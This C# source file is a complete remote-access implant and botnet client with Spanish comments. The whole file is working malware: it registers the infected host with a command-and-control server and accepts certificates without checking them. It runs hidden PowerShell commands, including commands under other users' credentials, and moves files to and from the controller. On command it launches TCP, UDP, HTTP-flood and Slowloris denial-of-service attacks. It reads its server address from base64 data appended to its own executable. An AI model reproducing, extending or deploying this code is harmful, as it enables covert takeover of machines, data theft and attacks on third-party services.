using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Principal;


namespace Implant
{

    public class Attack
    {
        public string Type { get; set; }
        public string Target { get; set; }
        public CancellationTokenSource CancellationTokenSource { get; set; }
    }


    public class Implant
    {
        private string _c2WsUrl;
        private string _group;
        private string _currentDir;
        private Dictionary<int, byte[]> _chunkSequences = new Dictionary<int, byte[]>();
        private bool _running;
        private List<Attack> _attacks;
        private string _implId;
        private ClientWebSocket _ws;
        private CancellationTokenSource _wsCancellationTokenSource;
        private List<byte[]> _uploadBuffer = new List<byte[]>();
        private string _uploadDestination = null;

        private readonly ConcurrentDictionary<string, List<byte>> _uploadBuffers = new ConcurrentDictionary<string, List<byte>>();
        private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();


        public Implant(string c2WsUrl, string group = "default")
        {
            _c2WsUrl = c2WsUrl;
            _group = group;
            _currentDir = Directory.GetCurrentDirectory();
            _running = true;
            _attacks = new List<Attack>();
            _implId = GetMachineGuid();
            _wsCancellationTokenSource = new CancellationTokenSource();
        }

        private async Task ExitWs()
        {
            CloseWebSocketAsync();
            Environment.Exit(0);
        }

        public async Task Run()
        {
            await Register();

            while (_running)
            {
                try
                {
                    await ConnectToC2();
                }
                catch (Exception)
                {
                    await Task.Delay(5000);
                }
            }
        }

        private async Task ConnectToC2()
        {
            System.Net.ServicePointManager.ServerCertificateValidationCallback +=
            (sender, certificate, chain, sslPolicyErrors) => true;

            _ws = new ClientWebSocket();

            var uri = new Uri($"wss://{_c2WsUrl}?id={_implId}-root={GetRoot()}-user={Environment.UserName}");

            try
            {

                
                await _ws.ConnectAsync(uri, _wsCancellationTokenSource.Token);

                while (_running && _ws.State == WebSocketState.Open)
                {
                    var message = await ReceiveMessage();
                    if (!string.IsNullOrEmpty(message))
                    {
                        await HandleCommand(message);
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }


        private async Task<string> ReceiveMessage()
        {
            var buffer = new byte[1024 * 4];
            var segment = new ArraySegment<byte>(buffer);
            var ms = new MemoryStream();

            WebSocketReceiveResult result;

            do
            {
                result = await _ws.ReceiveAsync(segment, _wsCancellationTokenSource.Token);
                ms.Write(buffer, 0, result.Count);
            }
            while (!result.EndOfMessage);

            if (result.MessageType == WebSocketMessageType.Close)
            {
                await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
                return null;
            }

            return Encoding.UTF8.GetString(ms.ToArray());
        }
        


        public async Task CloseWebSocketAsync()
        {
            try
            {
                _wsCancellationTokenSource?.Cancel();
                
                if (_ws != null && _ws.State == WebSocketState.Open)
                {
                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, 
                                        "Client closing", 
                                        CancellationToken.None);
                }
            }
            catch (WebSocketException ex)
            {
            }
            catch (Exception ex)
            {
            }
            finally
            {
                _ws?.Dispose();
                _wsCancellationTokenSource?.Dispose();
                _ws = null;
                _running = false;
            }
        }


        private async Task HandleCommand(string commandJson)
        {
            try
            {
                JObject data = JObject.Parse(commandJson);


                if (data.ContainsKey("cmd"))
                {
                    await ExecuteCommand(data["cmd"].ToString());
                }
                else if (data.ContainsKey("chunk"))
                {
                    var chunkData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["chunk"].ToString());
                    await HandleFileUpload(chunkData, data["destination"].ToString());

                }
                else if (data.ContainsKey("list_files"))
                {
                    var path = data.ContainsKey("path") ? data["path"].ToString() : _currentDir;
                    await ListDirectory(path);
                }
                else if (data.ContainsKey("get_files"))
                {
                    await SendFile(data["get_files"].ToString());
                }
                else if (data.ContainsKey("attack"))
                {
                    var attackData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["attack"].ToString());
                    await HandleAttackCommand(attackData);
                }
                else if (data.ContainsKey("stop_attack"))
                {
                    await StopAttack(data["stop_attack"].ToString());
                }
                else if (data.ContainsKey("finish"))
                {
                    ExitWs();
                }
            }
            catch (Exception e)
            {
                await SendResponse(new { error = e.Message });
            }
        }





        private async Task ExecuteCommand(string command)
        {
            command = command.Trim();

            if (command.StartsWith("cd "))
            {
                await ChangeDirectory(command.Substring(3).Trim());
            }
            else if (command.StartsWith("runas"))
            {
                await SendResponse(new
                {
                    result = "Runas command is not properly. Use: 'exec_as <user> <password> <host (localhost by default)> <command> &' instead.",
                    cwd = _currentDir
                });
            }
            else if (command.StartsWith("exec_as "))
            {
                await ExecuteAsUser(command.Substring(8).Trim());
            }
            else
            {

                if (command.EndsWith(" &"))
                {
                    var result =  await ExecuteShellCommand(command);

                    await SendResponse(new
                    {
                        result = result,
                        cwd = _currentDir
                    });

                }
                else
                {
                    var result = await ExecuteShellCommandAsync(command);
                    await SendResponse(new
                    {
                        result = !string.IsNullOrEmpty(result.output) ? result.output : result.error,
                        cwd = _currentDir
                    });

                }

            }
        }



        private async Task ExecuteAsUser(string commandWithCredentials)
        {
            try
            {
                var username = "";
                var password = "";
                var host = "localhost";
                var actualCommand = "";

                var parts = commandWithCredentials.Split(new char[] { ' ' }, 3);
                if (parts.Length < 3 || parts.Length > 4)
                {
                    await SendResponse(new
                    {
                        result = "Error: Wrong format. Use: exec_as <user> <password> <host (localhost by default)> <command>",
                        cwd = _currentDir
                    });
                    return;
                }

                if (parts.Length == 3)
                {
                    username = parts[0];
                    password = parts[1];
                    actualCommand = parts[2];
                }
                if (parts.Length == 4)
                {
                    username = parts[0];
                    password = parts[1];
                    host = parts[2];
                    actualCommand = parts[3];
                }

                var domain = Environment.UserDomainName;

                var result = await ExecutePowerShellAsUser(actualCommand, username, domain, password);

                await SendResponse(new
                {
                    result = result,
                    cwd = _currentDir,
                    executedAs = $"{domain}\\{username}"
                });
            }
            catch (Exception ex)
            {
                await SendResponse(new
                {
                    result = $"Error: {ex.Message}",
                    cwd = _currentDir
                });
            }
        }



        private async Task<string> ExecutePowerShellAsUser(string command, string username, string domain, string password, string host = "localhost")
        {
            try
            {
                string escapedPassword = password.Replace("'", "''");

                string currentExe = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);

                var updated_command = command;

                if (command.EndsWith("&"))
                    updated_command = command.Substring(0, command.Length - 1).Trim();



                string psScript = $@"
                  $securePassword = ConvertTo-SecureString '{escapedPassword}' -AsPlainText -Force
                  $credential = New-Object System.Management.Automation.PSCredential('{domain}\{username}', $securePassword)

                  try {{
                      $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
                          Set-Location $args[1]

                          if ($args[0] -match '\.(exe|com|bat|cmd|msi)$' ) {{
                              & $args[0] 2>&1 | Out-String
                          }}
                          else {{
                              Invoke-Expression $args[0] 2>&1 | Out-String
                          }}
                      }} -ArgumentList '{updated_command}', '{_currentDir}' -ErrorAction Stop

                      Write-Output ""$result""
                  }}
                  catch {{
                      Write-Output ""ERROR:$($_.Exception.Message)""
                  }}
                  ";

                var process = new Process
                {


                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psScript}\"",
                        WorkingDirectory = _currentDir,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    },
                    EnableRaisingEvents = true
                };

                if (command.IndexOf(currentExe, StringComparison.OrdinalIgnoreCase) >= 0 || command.EndsWith(" &"))
                {
                    process.StartInfo.RedirectStandardOutput = false;
                    process.StartInfo.RedirectStandardError = false;

                    process.Start();
                    return $"Process {process.Id} started in background (command matched {currentExe}).";
                }

                var outputBuilder = new StringBuilder();
                var errorBuilder = new StringBuilder();
                var tcs = new TaskCompletionSource<string>();

                process.OutputDataReceived += (s, e) =>
                {
                    if (e.Data != null)
                        outputBuilder.AppendLine(e.Data);
                };

                process.ErrorDataReceived += (s, e) =>
                {
                    if (e.Data != null)
                        errorBuilder.AppendLine(e.Data);
                };

                process.Exited += (s, e) =>
                {
                    if (errorBuilder.Length > 0)
                        tcs.TrySetResult("ERROR: " + errorBuilder.ToString());
                    else
                        tcs.TrySetResult(outputBuilder.ToString());

                    process.Dispose();
                };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                return await tcs.Task;
            }
            catch (Exception ex)
            {
                return $"Error ejecutando comando: {ex.Message}";
            }
        }


        private async Task<string> ExecuteShellCommand(string command)
        {
            try
            {
                // Si termina en &, lo quitamos
                if (command.EndsWith("&"))
                    command = command.Substring(0, command.Length - 1).Trim();

                string escapedCommand = command.Replace("'", "''").Replace("\"", "\\\"");
                string psCommand = $"& {escapedCommand}";

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
                        WorkingDirectory = _currentDir,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    },
                    EnableRaisingEvents = true
                };

                process.Start();

                return $"Process {process.Id} started in background.";
            }
            catch (Exception ex)
            {
                return $"{ex.Message}";
            }
        }



        private async Task<(string output, string error)> ExecuteShellCommandAsync(string command)
        {
            try
            {
                string escapedCommand = command.Replace("'", "''").Replace("\"", "\\\"");
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{escapedCommand}\"",
                        WorkingDirectory = _currentDir,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    },
                    EnableRaisingEvents = true
                };


                var outputBuilder = new StringBuilder();
                var errorBuilder = new StringBuilder();
                var tcs = new TaskCompletionSource<(string, string)>();

                process.OutputDataReceived += (s, e) => { if (e.Data != null) outputBuilder.AppendLine(e.Data); };
                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };

                process.Exited += (s, e) =>
                {
                    tcs.TrySetResult((outputBuilder.ToString(), errorBuilder.ToString()));
                    process.Dispose();
                };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                return await tcs.Task;
            }
            catch (Exception ex)
            {
                return ("", ex.Message);
            }
        }








        private async Task ChangeDirectory(string path)
        {
            try
            {
                path = path.Replace("\"", "");

                if (path == "..")
                {
                    _currentDir = Directory.GetParent(_currentDir)?.FullName ?? _currentDir;
                }
                else if (Path.IsPathRooted(path))
                {
                    if (Directory.Exists(path))
                        _currentDir = path;
                }
                else
                {
                    var newPath = Path.Combine(_currentDir, path);
                    if (Directory.Exists(newPath))
                        _currentDir = newPath;
                }

                await SendResponse(new
                {
                    result = "",
                    error = "",
                    cwd = _currentDir
                });
            }
            catch (Exception ex)
            {
                await SendResponse(new
                {
                    error = ex.Message,
                    cwd = _currentDir
                });
            }
        }
         private async Task HandleFileUpload(Dictionary<string, object> chunkData, string destination)
        {
            try
            {
                var part = Convert.FromBase64String(chunkData["data"].ToString());
                var isLast = chunkData.ContainsKey("last") && (bool)chunkData["last"];

                _uploadBuffer.Add(part);


                if (_uploadDestination == null)
                {
                    _uploadDestination = destination;
                }



                if (isLast)
                {
                    using (var fs = new FileStream(_uploadDestination, FileMode.Create, FileAccess.Write))
                    {
                        foreach (var chunk in _uploadBuffer)
                        {
                            await fs.WriteAsync(chunk, 0, chunk.Length);
                        }
                    }


                    // Limpiamos
                    _uploadBuffer.Clear();
                    _uploadDestination = null;

                    await _ws.SendAsync(
                    new ArraySegment<byte>(Encoding.UTF8.GetBytes("{\"status\": \"upload_complete\"}")),
                    WebSocketMessageType.Text,
                    true,
                    CancellationToken.None);
                }
            
            }
            catch (Exception e)
            {
            }
        }


        private async Task ListDirectory(string path)
        {
            if (!Directory.Exists(path))
            {
                await SendResponse(new { error = $"Ruta no encontrada: {path}" });
                return;
            }

            try
            {
                var items = new List<object>();

                foreach (var dir in Directory.GetDirectories(path))
                {
                    items.Add(new
                    {
                        name = Path.GetFileName(dir),
                        type = "directory",
                        size = 0
                    });
                }

                foreach (var file in Directory.GetFiles(path))
                {
                    var fileInfo = new FileInfo(file);
                    items.Add(new
                    {
                        name = Path.GetFileName(file),
                        type = "file",
                        size = fileInfo.Length
                    });
                }

                await SendResponse(new
                {
                    items = items,
                    path = path,
                    status = "success"
                });
            }
            catch (Exception e)
            {
                await SendResponse(new
                {
                    error = e.Message,
                    status = "error"
                });
            }
        }
        private async Task SendFile(string filePath)
        {
            const int chunkSize = 64 * 1024; // 64 KB

                if (filePath.StartsWith("//"))
                {
                    filePath = filePath.Replace("//", "/");
                }


            using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {


                byte[] buffer = new byte[chunkSize];
                int bytesRead;
                bool isLast;

                do
                {
                    bytesRead = await fs.ReadAsync(buffer, 0, buffer.Length);
                    isLast = fs.Position == fs.Length;

                    var chunkData = new
                    {
                        filename = Path.GetFileName(filePath),
                        path = filePath,
                        chunk = Convert.ToBase64String(buffer, 0, bytesRead),
                        last = isLast
                    };

                    string json = JsonConvert.SerializeObject(chunkData);

                    await _ws.SendAsync(
                        new ArraySegment<byte>(Encoding.UTF8.GetBytes(json)),
                        WebSocketMessageType.Text,
                        true,
                        CancellationToken.None);

                } while (!isLast);
            }
        }

        private async Task HandleAttackCommand(Dictionary<string, object> attackData)
        {
            try
            {
                var attackType = attackData["type"].ToString();
                var target = attackData["target"].ToString();
                var duration = attackData.ContainsKey("duration") ? Convert.ToInt32(attackData["duration"]) : 60;

                if (!_attacks.Any(a => a.Type == attackType && a.Target == target))
                {
                    var cts = new CancellationTokenSource();
                    var attack = new Attack
                    {
                        Type = attackType,
                        Target = target,
                        CancellationTokenSource = cts
                    };

                    _attacks.Add(attack);

                    var attackThread = new Thread(() =>
                    {
                        ExecuteAttack(attackType, target, duration, cts.Token);
                    })
                    { IsBackground = true };

                    attackThread.Start();

                    await SendResponse(new
                    {
                        status = "attack_running",
                        attack_type = attackType,
                        target = target,
                        duration = duration
                    });
                }
            }
            catch (Exception ex)
            {
                await SendResponse(new
                {
                    status = "error",
                    message = ex.Message
                });
            }
        }

        private void ExecuteAttack(string attackType, string target, int duration, CancellationToken cancellationToken)
        {
            DateTime endTime = DateTime.Now.AddSeconds(duration);

            try
            {
                switch (attackType.ToLower())
                {
                    case "tcp_flood":
                        TcpFloodAttack(target, endTime, cancellationToken);
                        break;
                    case "udp_flood":
                        UdpFloodAttack(target, endTime, cancellationToken);
                        break;
                    case "http_flood":
                        HttpFloodAttack(target, endTime, cancellationToken);
                        break;
                    case "slowloris":
                        SlowlorisAttack(target, endTime, cancellationToken);
                        break;
                    default:
                        throw new ArgumentException($"Unsupported attack: {attackType}");
                }
            }
            finally
            {
                Task.Run(() => NotifyAttackCompleted(attackType, target));
            }
        }

        private void TcpFloodAttack(string target, DateTime endTime, CancellationToken cancellationToken)
        {
            var targetParts = target.Split(':');
            if (targetParts.Length != 2) return;

            string targetIp = targetParts[0];
            int targetPort = int.Parse(targetParts[1]);

            while (DateTime.Now < endTime && !cancellationToken.IsCancellationRequested)
            {
                try
                {
                    using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.Connect(targetIp, targetPort);
                        var buffer = new byte[1024];
                        new Random().NextBytes(buffer);
                        socket.Send(buffer);
                        Thread.Sleep(10);
                    }
                }
                catch { }
            }
        }

        private void UdpFloodAttack(string target, DateTime endTime, CancellationToken cancellationToken)
        {
            var targetParts = target.Split(':');
            if (targetParts.Length != 2) return;

            string targetIp = targetParts[0];
            int targetPort = int.Parse(targetParts[1]);
            var endPoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);

            while (DateTime.Now < endTime && !cancellationToken.IsCancellationRequested)
            {
                try
                {
                    using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    {
                        var buffer = new byte[512];
                        new Random().NextBytes(buffer);
                        socket.SendTo(buffer, endPoint);
                        Thread.Sleep(1);
                    }
                }
                catch { }
            }
        }

        private void HttpFloodAttack(string target, DateTime endTime, CancellationToken cancellationToken)
        {
            if (!target.StartsWith("http://") && !target.StartsWith("https://"))
            {
                target = "http://" + target;
            }

            ServicePointManager.DefaultConnectionLimit = 1000;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;

            while (DateTime.Now < endTime && !cancellationToken.IsCancellationRequested)
            {
                try
                {
                    var request = (HttpWebRequest)WebRequest.Create(target);
                    request.Method = "GET";
                    request.Timeout = 5000;
                    request.ReadWriteTimeout = 5000;
                    request.Proxy = null;
                    request.KeepAlive = false;

                    using (var response = (HttpWebResponse)request.GetResponse())
                    using (var stream = response.GetResponseStream())
                    {
                        byte[] buffer = new byte[1024];
                        if (stream != null)
                            stream.Read(buffer, 0, buffer.Length);
                    }
                }
                catch { }
            }
        }

        private void SlowlorisAttack(string target, DateTime endTime, CancellationToken cancellationToken)
        {
            var targetParts = target.Split(':');
            if (targetParts.Length != 2) return;

            string targetIp = targetParts[0];
            int targetPort = int.Parse(targetParts[1]);
            var sockets = new List<Socket>();

            try
            {
                while (DateTime.Now < endTime && !cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socket.Connect(targetIp, targetPort);

                        string headers =
                            $"GET /?{new Random().Next(1000)} HTTP/1.1\r\n" +
                            $"Host: {targetIp}\r\n" +
                            "User-Agent: Mozilla/5.0\r\n" +
                            "Accept: text/html,application/xhtml+xml\r\n" +
                            "Accept-Language: en-US,en;q=0.5\r\n" +
                            "Accept-Encoding: gzip, deflate\r\n" +
                            "Connection: keep-alive\r\n\r\n";

                        socket.Send(Encoding.ASCII.GetBytes(headers));
                        sockets.Add(socket);
                    }
                    catch { }

                    foreach (var socket in sockets.ToList())
                    {
                        try
                        {
                            if (DateTime.Now < endTime && !cancellationToken.IsCancellationRequested)
                            {
                                socket.Send(Encoding.ASCII.GetBytes($"X-a: {new Random().Next(1000)}\r\n"));
                                Thread.Sleep(10000);
                            }
                        }
                        catch
                        {
                            sockets.Remove(socket);
                            socket.Dispose();
                        }
                    }
                }
            }
            finally
            {
                foreach (var socket in sockets)
                {
                    try { socket.Dispose(); } catch { }
                }
            }
        }

        private async Task StopAttack(string attackType)
        {
            try
            {
                List<Attack> attacksToStop;

                if (string.IsNullOrEmpty(attackType))
                {
                    attacksToStop = _attacks.ToList();
                }
                else
                {
                    attacksToStop = _attacks.Where(a => a.Type == attackType).ToList();
                }

                foreach (var attack in attacksToStop)
                {
                    attack.CancellationTokenSource.Cancel();
                    _attacks.Remove(attack);
                    await SendResponse(new
                    {
                        status = "attack_stopped",
                        attack_type = attack.Type,
                        target = attack.Target
                    });
                }
            }
            catch (Exception ex)
            {
                await SendResponse(new
                {
                    status = "error",
                    message = ex.Message
                });
            }
        }

        private async Task NotifyAttackCompleted(string attackType, string target)
        {
            try
            {
                await SendResponse(new
                {
                    status = "attack_completed",
                    attack_type = attackType,
                    target = target,
                    message = "Ataque finalizado"
                });
            }
            catch { }
        }

        private async Task Register()
        {
            try
            {
                var model = new
                {
                    impl_mac = GetMacAddresses(),
                    group = _group,
                    public_ip = GetPublicIp(),
                    local_ip = GetLocalIps(),
                    operating_system = GetOperatingSystem(),
                    impl_id = $"{_implId}-root={GetRoot()}-user={Environment.UserName}",
                    hostname = Environment.MachineName,
                    user = Environment.UserName,
                    root = GetRoot()
                };

                System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                (sender, cert, chain, sslPolicyErrors) => true;
                
                using (var client = new HttpClient())
                {
                    var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");

                    await client.PostAsync($"https://{_c2WsUrl}/api/impl/new/{model.impl_id}", content);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error en Register: {ex.Message}");
            }
        }

        private string GetMachineGuid()
        {
            try
            {
                if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                {
                    using (var regKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                    {
                        if (regKey != null)
                        {
                            var guid = regKey.GetValue("MachineGuid") as string;
                            if (!string.IsNullOrEmpty(guid))
                                return guid;
                        }
                    }
                }

                var envId = Environment.MachineName + Environment.UserName + Environment.OSVersion.VersionString;
                using (var md5 = System.Security.Cryptography.MD5.Create())
                {
                    var hash = md5.ComputeHash(Encoding.UTF8.GetBytes(envId));
                    return new Guid(hash).ToString();
                }
            }
            catch
            {
                return Guid.NewGuid().ToString();
            }
        }

        private List<string> GetMacAddresses()
        {
            var macAddresses = new List<string>();
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                    {
                        macAddresses.Add(nic.GetPhysicalAddress().ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error getting MAC addresses: {ex.Message}");
            }
            return macAddresses;
        }

        private string GetPublicIp()
        {
            try
            {
                using (var client = new WebClient())
                {
                    client.Proxy = null;
                    return client.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch
            {
                try
                {
                    using (var client = new WebClient())
                    {
                        client.Proxy = null;
                        return client.DownloadString("https://ipinfo.io/ip").Trim();
                    }
                }
                catch
                {
                    return "unknown";
                }
            }
        }

        private List<string> GetLocalIps()
        {
            var localIps = new List<string>();
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork &&
                        !ip.ToString().StartsWith("169.") &&
                        ip.ToString() != "127.0.0.1")
                    {
                        localIps.Add(ip.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error getting local IPs: {ex.Message}");
            }
            return localIps;
        }

        private string GetOperatingSystem()
        {
            try
            {
                if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                {
                    using (var regKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                    {
                        if (regKey != null)
                        {
                            var productName = regKey.GetValue("ProductName") as string;
                            var currentBuild = regKey.GetValue("CurrentBuild") as string;
                            return $"{productName} (Build {currentBuild})";
                        }
                    }
                }

                return $"{Environment.OSVersion}";
            }
            catch
            {
                return Environment.OSVersion.ToString();
            }
        }



        public bool GetRoot()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }


        private async Task SendResponse(object response)
        {
            if (_ws != null && _ws.State == WebSocketState.Open)
            {
                var json = JsonConvert.SerializeObject(response);
                var buffer = Encoding.UTF8.GetBytes(json);
                await _ws.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, _wsCancellationTokenSource.Token);
            }
        }
    }

    public class Program
    {
        public static async Task Main(string[] args)
        {

           try
            {

                string rutaCompleta = Assembly.GetExecutingAssembly().Location;
                string nombreArchivo = Path.GetFileName(rutaCompleta);

                byte[] datos = File.ReadAllBytes(rutaCompleta);

                int bytesParaLeer = Math.Min(1000, datos.Length);
                byte[] finalBytes = new byte[bytesParaLeer];
                Array.Copy(datos, datos.Length - bytesParaLeer, finalBytes, 0, bytesParaLeer);

                string texto = Encoding.Unicode.GetString(finalBytes);

                string[] raw_data = texto.Split(new string[] { "DATA=" }, StringSplitOptions.None);

                string base64_data = raw_data[1];
                byte[] base64Bytes = Convert.FromBase64String(base64_data);
                string decode_data = Encoding.UTF8.GetString(base64Bytes);

                string[] data = decode_data.Split('|');

                string url = data[1];
                string port = data[2];
                string group = data[3];


                var implant = new Implant( $"{url}:{port}", group);
                await implant.Run();


            }
            catch (Exception ex)
            {
            }
        }
    }
}